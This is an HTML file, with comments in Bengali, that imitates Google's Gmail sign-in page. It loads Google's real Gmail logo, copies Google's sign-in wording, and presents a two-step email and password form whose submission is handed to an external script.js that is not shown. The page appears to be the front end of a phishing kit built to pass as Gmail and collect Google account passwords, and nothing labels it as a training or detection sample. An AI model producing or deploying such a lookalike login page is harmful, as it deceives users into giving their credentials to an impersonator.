<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Gmail লগইন</title>
  <link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="container">
    <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" alt="Gmail Logo" class="logo">
    <h2>Sign in</h2>
    <p>to continue to Gmail</p>

    <form name="login-form">
      <!-- ইমেল ধাপ -->
      <div id="email-step">
        <input type="email" name="email" placeholder="Email" required>
        <button type="button" onclick="showPasswordStep()">Next</button>
      </div>

      <!-- পাসওয়ার্ড ধাপ -->
      <div id="password-step" class="hidden">
        <div class="password-wrapper">
          <input type="password" name="password" placeholder="Password" id="password" required>
          <span class="toggle-password" onclick="togglePassword()">
            <!-- চোখ খোলা SVG -->
            <svg id="eye-open" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#555">
              <path d="M12 4.5C7.305 4.5 3.135 7.364 1.5 12c1.635 4.636 5.805 7.5 10.5 7.5s8.865-2.864 10.5-7.5C20.865 7.364 16.695 4.5 12 4.5zm0 12.75c-2.887 0-5.25-2.363-5.25-5.25S9.113 6.75 12 6.75s5.25 2.363 5.25 5.25-2.363 5.25-5.25 5.25zm0-9a3.75 3.75 0 100 7.5 3.75 3.75 0 000-7.5z"/>
            </svg>

            <!-- চোখ বন্ধ SVG -->
            <svg id="eye-closed" xmlns="http://www.w3.org/2000/svg" height="20" width="20" fill="#555" style="display: none;">
              <path d="M12 4.5c-2.17 0-4.23.678-6.02 1.904L4.07 5.5 2.5 7.07l16.36 16.36 1.57-1.57-2.026-2.026C19.218 17.316 21 14.8 21 12c-1.635-4.636-5.805-7.5-10.5-7.5zm0 12.75a5.25 5.25 0 01-5.25-5.25c0-1.072.315-2.068.86-2.905L5.02 6.404A10.467 10.467 0 003 12c1.635 4.636 5.805 7.5 10.5 7.5 1.398 0 2.727-.276 3.954-.775l-2.51-2.51a5.205 5.205 0 01-2.944.525zm.75-5.25a.75.75 0 11-1.5 0 .75.75 0 011.5 0z"/>
            </svg>
          </span>
        </div>
        <button type="submit">Submit</button>
      </div>
    </form>

    <p><a href="#">Forgot email?</a></p>
    <p>Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more</a></p>
  </div>

  <footer>
    <select>
      <option>English (United States)</option>
      <option>বাংলা</option>
    </select>
    <a href="#">Help</a>
    <a href="#">Privacy</a>
    <a href="#">Terms</a>
  </footer>

  <script src="script.js"></script>
</body>
</html>
